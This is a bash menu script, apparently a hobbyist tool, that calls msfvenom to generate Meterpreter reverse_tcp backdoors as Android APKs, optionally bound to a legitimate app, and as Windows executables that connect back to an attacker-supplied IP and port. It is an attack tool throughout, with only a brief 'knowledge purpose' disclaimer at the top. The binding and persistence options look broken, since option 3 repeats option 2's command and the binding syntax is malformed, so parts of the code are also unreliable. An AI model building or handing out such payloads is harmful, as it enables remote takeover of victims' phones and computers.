printf "\n\n\t\t\twritten by: Animesh Sinha\n\n\t\t\tgithub: animesh-h\n\n\n"
echo -n "WARNING: THIS SCRIPT IS FOR KNOWLEDGE PURPOSE SO PLEASE DON'T USE IT ILLEGALY"
count=0
while [ $count -eq 0 ]
do
printf "\n\nEnter the type of os for which you want to create payload" 
printf "\n\n1.android\n2.windows\n3.mac os\n"
read n
case $n in
1)
printf "\n\t\t<<<<---:ANDROID PAYLOAD SECTION:--->>>>\n"
printf "\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n"
read x
case $x in
1)
        echo -n "APK ONLY(NON-PERSISTENCE)"
        echo -n "enter your ip: "
        read i_p
        echo -n "enter port: "
        read p
        echo -n "enter name of apk: "
        read nm
        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
        ;;
2)
        echo -n "BINDED APK ONLY(NON-PERSISTENCE)"
        echo -n "enter your ip: "
        read i_p
        echo -n "enter port: "
        read p
        echo -n "enter name of apk: "
        read nm
        echo -n "attach original apk for binding: "
        read f
        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
        ;;
3)
        echo -n "PERSISTENCE BINDED APK"
        echo -n "enter your ip: "
        read i_p
        echo -n "enter port: "
        read p
        echo -n "enter name of apk: "
        read nm
        echo -n "attach original apk for binding: "
        read f
        msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
        ;;
        esac;;
2)
        printf "\n\t\t<<<<---:WINDOWS PAYLOAD SECTION :--->>>>\n\n"
        echo -n "enter your ip: "
        read i_p
        echo -n "enter port: "
        read p
        echo -n "enter name of exe: "
        read nm
        msfvenom -p windows/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.exe
        ;;
3)
printf "\t\t\t<<<<<<< NOT YET READY >>>>>>>>\t\t\t\n"
;;
*)
printf "ENTERED WRONG OPTION"
printf "\n1.try again\n2.exit\n"
read op
case $op in
1)
count=0
;;
2)
count=1
exit
;;
*)
count=1
exit
;;
esac
esac
done
